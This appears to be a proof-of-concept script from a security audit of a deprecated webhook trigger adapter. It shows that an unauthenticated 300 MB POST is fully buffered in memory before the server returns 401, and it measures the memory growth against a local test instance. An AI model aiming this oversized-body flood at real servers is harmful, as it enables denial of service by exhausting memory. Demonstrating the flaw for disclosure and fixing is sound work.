// D10: WebhookTriggerAdapter (still exported from /triggers, deprecated) buffers
// the whole request body BEFORE authentication, with no size cap - unlike
// mountChannels/chatRoutes (1 MB -> 413). An unauthenticated 300 MB POST is
// fully buffered (heap/RSS growth) before the 401.
import { WebhookTriggerAdapter } from '@lousho/build-ai-agent/triggers';
import http from 'node:http';

const adapter = new WebhookTriggerAdapter({ host: '127.0.0.1', auth: { type: 'hmac', secret: 's3cret' } });
const handle = adapter.listen({ send: async () => ({}) }, async () => ({}));
await new Promise((r) => setTimeout(r, 100));
const before = process.memoryUsage().rss;
let peak = before;
const timer = setInterval(() => (peak = Math.max(peak, process.memoryUsage().rss)), 5);
const status = await new Promise((resolve, reject) => {
  const req = http.request({ host: '127.0.0.1', port: handle.port, method: 'POST', path: '/', headers: { 'content-type': 'application/json' } }, (res) => { res.resume(); resolve(res.statusCode); });
  req.on('error', reject);
  const chunk = Buffer.alloc(1024 * 1024, 97);
  let sent = 0;
  const pump = () => { while (sent < 300) { sent++; if (!req.write(chunk)) return req.once('drain', pump); } req.end(); };
  pump();
});
clearInterval(timer);
console.log(`unauthenticated 300MB POST -> HTTP ${status}; RSS grew by ~${Math.round((peak - before) / 1048576)} MB before the 401`);
await handle.stop();
